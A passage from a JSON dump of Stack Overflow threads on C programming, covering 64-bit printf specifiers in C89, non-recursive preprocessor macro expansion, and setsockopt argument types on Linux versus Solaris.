{"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 1, "creation_date": 1520359134, "post_id": 48672714, "comment_id": 85279372, "body": "@KeithThompson, C89 lacking <code>#error</code> is news to my copy of draft N843, and K&amp;R2. In any case, within the constraints of C89, if <code>long</code> is at least 64 bits then this is the way to print such a value."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1520378652, "post_id": 48672714, "comment_id": 85288770, "body": "You&#39;re right, C89/C90 does have <code>#error</code>. (I believe C99 added the requirement that <code>#error</code> causes translation to fail; C89/C90 merely requires a diagnostic. I suspect most or all C89/C90 compilers did treat it as a fatal error, though.)"}, {"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "reply_to_user": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1520537380, "post_id": 48672714, "comment_id": 85367558, "body": "@KeithThompson, once you started commenting on <i>this</i> answer my opinion of your C knowledge took a nosedive. It would really help if you actually read the standard (or a draft thereof) in question before commenting on it. Way back in 1989 section 4 Conformance said &quot;[#4] The implementation shall not successfully translate a preprocessing translation unit containing a #error preprocessing directive unless it is part of a group skipped by conditional inclusion.&quot; So, for the third time here: you&#39;re demonstrably wrong. SMH."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1520539270, "post_id": 48672714, "comment_id": 85368574, "body": "Can you cite the exact name of the document you&#39;re quoting? The 1989 ANSI C standard did not have a &quot;Conformance&quot; section (I have a plain-text draft, not the actual standard). In the 1990 ISO C standard, section 4 is titled &quot;Compliance&quot;, not &quot;Conformance&quot;, and it does not include the wording you cite (my copy is <code>ansi+iso+9899-1990+(r1997).pdf</code>). That wording does appear in the C99 standard. Images: <a href=\"https://imgur.com/a/CjWXI\" rel=\"nofollow noreferrer\">imgur.com/a/CjWXI</a>"}, {"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "reply_to_user": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1520814087, "post_id": 48672714, "comment_id": 85456834, "body": "JTC1/SC22/WG14 N843 (linked-to from <a href=\"http://www.lysator.liu.se/c/index.html\" rel=\"nofollow noreferrer\">lysator.liu.se/c/index.html</a> as &quot;N843, the official committee document&quot;)"}, {"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "reply_to_user": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1520814909, "post_id": 48672714, "comment_id": 85457017, "body": "and I can climb down off my own high horse: N843 is pre-C99, so you may well be correct regarding the absence of a requirement to terminate compilation upon encountering <code>#error</code>. But plenty of compilers I encountered already implemented this, even back in &#39;89."}], "tags": [], "owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "is_accepted": false, "score": 0, "last_activity_date": 1518035392, "creation_date": 1518035392, "answer_id": 48672714, "question_id": 48670422, "link": "https://stackoverflow.com/questions/48670422/printf-format-specifier-for-int64-t-and-uint64-t-in-32-bit-ansi-c/48672714#48672714", "title": "printf() format specifier for int64_t and uint64_t in 32-bit ANSI C", "body": "<p>One way to ensure you can use a 64 bit integer with a C89 compiler:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;limits.h&gt;\ntypedef unsigned long uint64_t;\n\nint main() {\n    uint64_t some_int = 123456789;\n    assert(CHAR_BIT * sizeof(long) &gt;= 64);\n    printf(\"Your int is: %lu\\n\", some_int);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 8286361, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65699b4181281fc7cf4037730139932f?s=128&d=identicon&r=PG&f=1", "display_name": "tmaxthomas", "link": "https://stackoverflow.com/users/8286361/tmaxthomas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6079, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1518035392, "creation_date": 1518026230, "last_edit_date": 1518026804, "question_id": 48670422, "link": "https://stackoverflow.com/questions/48670422/printf-format-specifier-for-int64-t-and-uint64-t-in-32-bit-ansi-c", "title": "printf() format specifier for int64_t and uint64_t in 32-bit ANSI C", "body": "<p>I'm writing some 32-bit ANSI C, compiling with <code>gcc</code>, in which I need to print some 64-bit signed and unsigned integers. The problem is that in <code>gcc</code> 32-bit C, <code>int64_t</code> and <code>uint64_t</code> get converted to long long int and unsigned long long int respectively, with format specifier <code>%lld</code> and <code>%llu</code>, which are not supported by ANSI C. Using the format specifier macros provided in <code>inttypes.h</code> don't help either, since those get converted to <code>%lld</code> and <code>%llu</code>.</p>\n\n<p>The following code fails to compile:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;inttypes.h&gt;\n\nint main() {\n    uint64_t some_int = 123456789;\n    printf(\"Your int is: %\"PRId64\"\\n\", some_int);\n    return 0;\n}\n</code></pre>\n\n<p>Compiled with <code>gcc main.c -ansi -Og -g -m32 -Wall -Werror -Wextra -pedantic</code></p>\n\n<p>Error message is:</p>\n\n<pre><code>error: ISO C90 does not support the \u2018ll\u2019 gnu_printf length modifier [-Werror=format=]\n</code></pre>\n\n<p>So, my question is: What format specifier should I use to print double-length integers in 32-bit ANSI C?</p>\n"}, {"tags": ["c", "macros"], "answers": [{"comments": [{"owner": {"reputation": 121, "user_id": 2031860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd35054a951e9e9d79a0c48dec52e756?s=128&d=identicon&r=PG", "display_name": "Selso Liberado", "link": "https://stackoverflow.com/users/2031860/selso-liberado"}, "edited": false, "score": 0, "creation_date": 1518036937, "post_id": 48670645, "comment_id": 84344459, "body": "That is right. I finally found another <a href=\"https://stackoverflow.com/questions/12447557/can-we-have-recursive-macros\">question</a> with similar answers as yours. I may try the workaround from <a href=\"https://github.com/pfultz2/Cloak/wiki/C-Preprocessor-tricks,-tips,-and-idioms#deferred-expression\" rel=\"nofollow noreferrer\">Paul Fultz</a>"}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 1, "last_activity_date": 1518027056, "creation_date": 1518027056, "answer_id": 48670645, "question_id": 48670362, "link": "https://stackoverflow.com/questions/48670362/c-preprocessor-macro-expension-limit-using-imbricated-macro-with-arguments/48670645#48670645", "title": "C preprocessor macro expension limit, using imbricated macro with arguments", "body": "<p>The problem is not that the preprocessor fails to rescan, but rather that when it does, it refuses to expand the appearance of the <code>XPOS_IS_AFTER()</code> macro in text resulting (indirectly) from a previous expansion of that same macro.  In other words, the preprocessor does not support macro recursion.  This is explicitly specified by the standard:</p>\n\n<blockquote>\n  <p>[When rescanning a macro's replacement text,] If the name of the macro being replaced is found during this scan of the replacement list (not including the rest of the source file's preprocessing tokens), it is not replaced. Furthermore, if any nested replacements encounter the name of the macro being replaced, it is not replaced. These nonreplaced macro name preprocessing tokens are no longer available for further replacement even if they are later (re)examined in contexts in which that macro name preprocessing token would otherwise have been replaced.</p>\n</blockquote>\n\n<p>(<a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.10.3.4p2\" rel=\"nofollow noreferrer\">C2011, 6.10.3.4/2</a> )</p>\n\n<p>GCC does exactly what it should with your code.  You'll need a different plan.</p>\n"}, {"tags": [], "owner": {"reputation": 121, "user_id": 2031860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd35054a951e9e9d79a0c48dec52e756?s=128&d=identicon&r=PG", "display_name": "Selso Liberado", "link": "https://stackoverflow.com/users/2031860/selso-liberado"}, "is_accepted": false, "score": 0, "last_activity_date": 1518515654, "last_edit_date": 1518515654, "creation_date": 1518512915, "answer_id": 48763029, "question_id": 48670362, "link": "https://stackoverflow.com/questions/48670362/c-preprocessor-macro-expension-limit-using-imbricated-macro-with-arguments/48763029#48763029", "title": "C preprocessor macro expension limit, using imbricated macro with arguments", "body": "<p>After reading the prep-processor tricks from Paul F, and many tries I concluded that it was not appliable to my case because I don't explicitely write a recursive macro, as it seems to be the case in the workaround I read.</p>\n\n<p>So I write some macro less efficient where I avoid the recursion : </p>\n\n<pre><code>#define XPOS_ISAFTER(obj) ( obj##_XPOS + obj##_XSIZE )\n#define XPOS_ISAFTER2(obj1,obj2) (XPOS_ISAFTER(obj1) + obj2##_XSIZE)\n#define XPOS_ISAFTER3(obj1,obj2, obj3) (XPOS_ISAFTER2(obj1, obj2) + obj3##_XSIZE)\n\n\n#define YPOS_ISUNDER(obj) ( obj##_YPOS +  obj##_YSIZE )\n#define YPOS_ISUNDER2(obj1,obj2) ( YPOS_ISUNDER(obj1) + obj2##_YSIZE )\n#define YPOS_ISUNDER3(obj1, obj2, obj3) ( YPOS_ISUNDER2(obj1,obj2) + obj3##_YSIZE )\n#define YPOS_ISUNDER4(obj1,obj2, obj3, obj4) ( YPOS_ISUNDER3(obj1,obj2, obj3) + obj4##_YSIZE )\n</code></pre>\n"}], "owner": {"reputation": 121, "user_id": 2031860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd35054a951e9e9d79a0c48dec52e756?s=128&d=identicon&r=PG", "display_name": "Selso Liberado", "link": "https://stackoverflow.com/users/2031860/selso-liberado"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1518515654, "creation_date": 1518026006, "question_id": 48670362, "link": "https://stackoverflow.com/questions/48670362/c-preprocessor-macro-expension-limit-using-imbricated-macro-with-arguments", "title": "C preprocessor macro expension limit, using imbricated macro with arguments", "body": "<p>I've made some macro to help me design a dialog's widget, in a gcc project.\nBut I'm getting compilation errors, so I made the following test : </p>\n\n<pre><code>#define XPOS_ISAFTER(obj) (obj##_XPOS + obj##_XSIZE)\n\n#define PMD_TUTU_XPOS 10\n#define PMD_TUTU_XSIZE 10\n\n#define PMD_TUTU2_XPOS  XPOS_ISAFTER(PMD_TUTU)\n#define PMD_TUTU2_XSIZE 20\n\n#define PMD_TUTU3_XPOS  XPOS_ISAFTER(PMD_TUTU2)\n\n\nint main(void){\nint i = 0;\n    printf(\"Hello World!\\n\");\n    fflush(stdout);\n\n      /* Infinite loop */\n      while (1)\n      {\n          i += PMD_TUTU2_XPOS;\n          i += PMD_TUTU3_XPOS;\n      }\n\n    return 0;\n}\n</code></pre>\n\n<p>When asking for preprocessor output I get the following :</p>\n\n<pre><code>839 int main(void){\n840     int i = 0;\n841         printf(\"Hello World!\\n\");\n842             fflush(stdout);\n843\n844\n845                   while (1)\n846                           {\n847                                       i += (10 + 10);\n848                                       i += (XPOS_ISAFTER(PMD_TUTU) + 20);\n849                                                   }\n850\n851                     return 0;\n</code></pre>\n\n<p>I have search some advices <a href=\"https://github.com/pfultz2/Cloak/wiki/C-Preprocessor-tricks,-tips,-and-idioms\" rel=\"nofollow noreferrer\">tricks</a> to force rescan, without any result.\nSo the pre-processor do not expand this recursive macro ?</p>\n"}, {"tags": ["c", "linux", "sockets", "solaris"], "comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1518025845, "post_id": 48670299, "comment_id": 84338302, "body": "Use the number <code>1</code>, not the character <code>&#39;1&#39;</code>."}, {"owner": {"reputation": 217, "user_id": 8335546, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0583eef8bce48dec8a08d5a9ce5a2116?s=128&d=identicon&r=PG&f=1", "display_name": "Shiu Chun Ming", "link": "https://stackoverflow.com/users/8335546/shiu-chun-ming"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1518025973, "post_id": 48670299, "comment_id": 84338380, "body": "Seems like the optvalue for solaris is  a character &#39;1&#39;."}, {"owner": {"reputation": 217, "user_id": 8335546, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0583eef8bce48dec8a08d5a9ce5a2116?s=128&d=identicon&r=PG&f=1", "display_name": "Shiu Chun Ming", "link": "https://stackoverflow.com/users/8335546/shiu-chun-ming"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1518025980, "post_id": 48670299, "comment_id": 84338385, "body": "I saw it from <a href=\"https://stackoverflow.com/questions/5592747/bind-error-while-recreating-socket\" title=\"bind error while recreating socket\">stackoverflow.com/questions/5592747/&hellip;</a>"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 2, "creation_date": 1518026075, "post_id": 48670299, "comment_id": 84338451, "body": "It&#39;s incorrect.  You use <code>char</code> for the type, but the value is the same."}, {"owner": {"reputation": 217, "user_id": 8335546, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0583eef8bce48dec8a08d5a9ce5a2116?s=128&d=identicon&r=PG&f=1", "display_name": "Shiu Chun Ming", "link": "https://stackoverflow.com/users/8335546/shiu-chun-ming"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1518026375, "post_id": 48670299, "comment_id": 84338628, "body": "Unfortunately, same error message happen :("}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 2, "creation_date": 1518027584, "post_id": 48670299, "comment_id": 84339320, "body": "BTW, the second <code>#ifdef</code> is unnecessary if you write <code>size_t len = sizeof val;</code>, to use the already-selected type."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518040804, "post_id": 48670299, "comment_id": 84346381, "body": "What version of Solaris?  How are you compiling and linking your program?  If you&#39;re linking with <code>-lxnet</code> and not <code>-lsocket -lnsl</code>, the prototype is <code>int setsockopt(int socket, int level, int option_name,      const void* option_value, socklen_t option_len);</code>  See <a href=\"https://docs.oracle.com/cd/E36784_01/html/E36875/setsockopt-3xnet.html#scrolltoc\" rel=\"nofollow noreferrer\">docs.oracle.com/cd/E36784_01/html/E36875/&hellip;</a>  (And if you look in Solaris 11&#39;s <code>&#47;usr&#47;include&#47;sys&#47;socket.h</code>, you&#39;d see that&#39;s the prototype anyway - because with C, you can pass a <code>char *</code> to a <code>void *</code> and an <code>int</code> to a <code>socklen_t</code> without error)"}], "answers": [{"comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518040205, "post_id": 48672384, "comment_id": 84346094, "body": "Solaris provides <i>two</i> <code>setsockopt()</code> function calls, depending on whether or not the program links with <code>-lsocket -lnsl</code> or with <code>-lxnet</code>.  See <a href=\"https://docs.oracle.com/cd/E36784_01/html/E36875/setsockopt-3socket.html#scrolltoc\" rel=\"nofollow noreferrer\">docs.oracle.com/cd/E36784_01/html/E36875/&hellip;</a> and <a href=\"https://docs.oracle.com/cd/E36784_01/html/E36875/setsockopt-3xnet.html#scrolltoc\" rel=\"nofollow noreferrer\">docs.oracle.com/cd/E36784_01/html/E36875/&hellip;</a>"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518040758, "post_id": 48672384, "comment_id": 84346356, "body": "This link is better:  <a href=\"https://docs.oracle.com/cd/E18752_01/html/816-5170/setsockopt-3socket.html\" rel=\"nofollow noreferrer\">docs.oracle.com/cd/E18752_01/html/816-5170/&hellip;</a>  (that&#39;s an old Solaris 10 man page for <code>setsockopt.3socket</code>).  The 3xnet entry is <a href=\"https://docs.oracle.com/cd/E18752_01/html/816-5170/setsockopt-3xnet.html\" rel=\"nofollow noreferrer\">docs.oracle.com/cd/E18752_01/html/816-5170/&hellip;</a>  On Solaris 11, the prototypes both use <code>void *</code> and <code>socklen_t</code>."}, {"owner": {"reputation": 321, "user_id": 6044821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d6486089e3dd3a779cb73b6631ec6a5?s=128&d=identicon&r=PG&f=1", "display_name": "A.B", "link": "https://stackoverflow.com/users/6044821/a-b"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518043384, "post_id": 48672384, "comment_id": 84347549, "body": "Ok thanks. I&#39;ll update my answer to state that Solaris 11 has the same defintions with your 2nd link. AND I&#39;ll correct a mistake I made: setsockopt() doesn&#39;t take a pointer to the size (len), only getsockopt() does"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518081428, "post_id": 48672384, "comment_id": 84360457, "body": "If you have access to Solaris 10, it&#39;d be interesting to see what&#39;s in <code>&#47;usr&#47;include&#47;sys&#47;socket.h</code> there.  All I have access to is OpenSolaris and Solaris 11, which all use the later, POSIX-compliant prototype.  POSIX made quite a mess in this case, IMO."}, {"owner": {"reputation": 321, "user_id": 6044821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d6486089e3dd3a779cb73b6631ec6a5?s=128&d=identicon&r=PG&f=1", "display_name": "A.B", "link": "https://stackoverflow.com/users/6044821/a-b"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518084209, "post_id": 48672384, "comment_id": 84362389, "body": "Actually acc&#232;s to none, I stopped being in contact with Solaris after Solaris 8. My answer required more historical dig and verifications than anything else. The Oracle documentation should be enough about the len type? It&#39;s more about the canonical way to pass a boolean for the value in (3XNET) that isn&#39;t that well defined."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1518100011, "post_id": 48672384, "comment_id": 84373349, "body": "I just looked into <code>&#47;usr&#47;include&#47;sys&#47;socket.h</code> on a Solaris 10 system.  There are numerous variations on <code>#if defined(_XPG4_2)</code> and <code>#if defined(_XPG5)</code> in the header, changing among other things function prototypes.  The OP really needs to look into how his code is compiled and linked to ensure it&#39;s all consistent."}], "tags": [], "owner": {"reputation": 321, "user_id": 6044821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d6486089e3dd3a779cb73b6631ec6a5?s=128&d=identicon&r=PG&f=1", "display_name": "A.B", "link": "https://stackoverflow.com/users/6044821/a-b"}, "is_accepted": true, "score": 3, "last_activity_date": 1518049708, "last_edit_date": 1518049708, "creation_date": 1518033979, "answer_id": 48672384, "question_id": 48670299, "link": "https://stackoverflow.com/questions/48670299/setsockopt-usage-in-linux-and-solaris-invalid-argument-in-solaris/48672384#48672384", "title": "setsockopt usage in Linux and Solaris [Invalid argument in Solaris]", "body": "<p>There are 2 issues appearing in the question:</p>\n\n<ul>\n<li><blockquote>\n  <p>Linux uses a <code>long</code> for optvalue as a parameter, but Solaris uses a <code>char</code>\n  instead.</p>\n</blockquote></li>\n</ul>\n\n<p>TL;DR: you should use <code>int</code> everywhere.</p>\n\n<p>in Solaris there can be slightly different definitions of <code>setsockopt()</code> depending on the version of Solaris and the library the program is linked against, for example Solaris 10's <a href=\"https://docs.oracle.com/cd/E18752_01/html/816-5170/setsockopt-3socket.html\" rel=\"nofollow noreferrer\">setsockopt (3SOCKET)</a>, <a href=\"https://docs.oracle.com/cd/E18752_01/html/816-5170/setsockopt-3xnet.html\" rel=\"nofollow noreferrer\">setsockopt (3XNET)</a> and Solaris 11's <a href=\"https://docs.oracle.com/cd/E36784_01/html/E36875/getsockopt-3socket.html\" rel=\"nofollow noreferrer\">setsockopt (3SOCKET)</a>, <a href=\"https://docs.oracle.com/cd/E36784_01/html/E36875/setsockopt-3xnet.html\" rel=\"nofollow noreferrer\">setsockopt (3XNET)</a>. <a href=\"http://man7.org/linux/man-pages/man2/setsockopt.2.html\" rel=\"nofollow noreferrer\">Linux' manpage</a> shares the same contents as Solaris' (3SOCKET) manpages:</p>\n\n<blockquote>\n  <p>Most socket-level options utilize an <strong>int</strong> argument for optval. For\n  setsockopt(), the argument should be nonzero to enable a boolean\n  option, or zero if the  option is to be disabled.</p>\n</blockquote>\n\n<p>(3XNET) just doesn't state the type for bolean option. Yet-an-other-UNIX (AIX) also has old *BSD and UNIX98/XOPEN versions, on a <a href=\"https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_73/apis/ssocko.htm\" rel=\"nofollow noreferrer\">single page</a>, where it's an <code>int</code> for booleans. The confusion about using <code>char</code> comes from (*BSD-style) examples using a pointer cast to <code>(char *)</code> instead of <code>(const void *)</code>, because the prototype is using <code>char *</code> for *BSD/3XNET. That doesn't mean the parameter is <code>char</code>. As for <code>long</code>, beside not being in the definition, on architectures where <a href=\"https://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models\" rel=\"nofollow noreferrer\"><code>long</code> is not <code>int</code></a> that would be wrong. Note that Windows is apart from *NIX there.</p>\n\n<ul>\n<li><blockquote>\n<pre><code>size_t len = sizeof(char);\n</code></pre>\n</blockquote></li>\n</ul>\n\n<p>Beside the fact that <code>sizeof val</code> should be preferred, and can be used directly in <code>setsockopt()</code> without even the need to use <code>len</code> here in the first place, <code>len</code> is defined as <code>int</code> on Solaris (3XNET) and as <code>socklen_t</code> on Solaris (3SOCKET) and Linux, not <code>size_t</code> anywhere. <a href=\"http://yarchive.net/comp/linux/socklen_t.html\" rel=\"nofollow noreferrer\">Link to a possible explanation</a> on why <code>int</code> became <code>socklen_t</code> with a brief (and wrong) passage via <code>size_t</code>. Using other types (such as <code>size_t</code> on Linux) might break on some architectures when <code>size_t</code> is not defined as <code>int</code> (see the 2 previous links).</p>\n"}], "owner": {"reputation": 217, "user_id": 8335546, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0583eef8bce48dec8a08d5a9ce5a2116?s=128&d=identicon&r=PG&f=1", "display_name": "Shiu Chun Ming", "link": "https://stackoverflow.com/users/8335546/shiu-chun-ming"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 915, "favorite_count": 1, "accepted_answer_id": 48672384, "answer_count": 1, "score": 0, "last_activity_date": 1518049708, "creation_date": 1518025737, "last_edit_date": 1518027695, "question_id": 48670299, "link": "https://stackoverflow.com/questions/48670299/setsockopt-usage-in-linux-and-solaris-invalid-argument-in-solaris", "title": "setsockopt usage in Linux and Solaris [Invalid argument in Solaris]", "body": "<p>I'm trying to use <code>setsockopt()</code> on both Linux and Solaris in my ftp program.</p>\n\n<p>Linux uses a <code>long</code> for <code>optvalue</code> as a parameter, but Solaris uses a <code>char</code> instead.</p>\n\n<pre><code>#ifdef sun\n    char val;\n#else\n    long val;\n#endif\n\n#ifdef sun\n    val = 1;\n    size_t len = sizeof(char);\n    if(setsockopt(s_socket_fd, SOL_SOCKET, SO_REUSEADDR, &amp;val, len) == -1) {\n        perror(\"Fail\");\n        exit(1);\n    }\n#else\n    val = 1;\n    size_t len = sizeof(long);\n    if(setsockopt(s_socket_fd, SOL_SOCKET, SO_REUSEADDR, &amp;val, len) == -1) {\n        perror(\"Fail\");\n        exit(1);\n    }\n#endif\n</code></pre>\n\n<p>The program works fine in Linux, but reports \"Invalid argument\" in Solaris when creating the socket.</p>\n"}, {"tags": ["c", "operating-system", "cpu", "cpu-architecture"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 3, "creation_date": 1518025826, "post_id": 48670218, "comment_id": 84338291, "body": "Have you read <a href=\"http://man7.org/linux/man-pages/man2/pause.2.html\" rel=\"nofollow noreferrer\">the documentation for <code>pause()</code></a>?  Assuming you mean the POSIX-defined function of that name, it causes the calling thread to <i>sleep</i> until a signal is delivered to the process.  Unlike a busy-waiting loop, sleeping does not consume CPU -- that&#39;s pretty much its definition."}, {"owner": {"reputation": 3617, "user_id": 6243553, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/4jGJ2.jpg?s=128&g=1", "display_name": "HarshitMadhav", "link": "https://stackoverflow.com/users/6243553/harshitmadhav"}, "edited": false, "score": 2, "creation_date": 1518026132, "post_id": 48670218, "comment_id": 84338479, "body": "No, the checking of variable doesn&#39;t ruin that. Infact the pause() in while loop checks for whether the process has not experienced any kind of sleep and if the process is done the condition of if breaks."}, {"owner": {"reputation": 18530, "user_id": 3344003, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/988af95d5692ee66b1fc2fe725ba738e?s=128&d=identicon&r=PG&f=1", "display_name": "user3344003", "link": "https://stackoverflow.com/users/3344003/user3344003"}, "edited": false, "score": 0, 